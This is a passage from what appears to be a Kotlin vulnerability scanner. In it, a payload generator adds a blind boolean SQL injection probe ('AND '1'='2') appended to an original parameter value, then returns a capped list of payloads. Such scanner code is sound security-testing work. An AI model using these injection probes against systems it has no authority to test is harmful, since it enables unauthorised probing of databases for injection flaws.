            ))
            payloads.add(Payload(
                "$originalValue' AND '1'='2",
                VulnClass.SQLI,
                DetectionMethod.BLIND_BOOLEAN,
                PayloadRisk.SAFE,
                "Different/empty response"
            ))
        }
        
        return payloads.take(maxPayloads)
    }
}
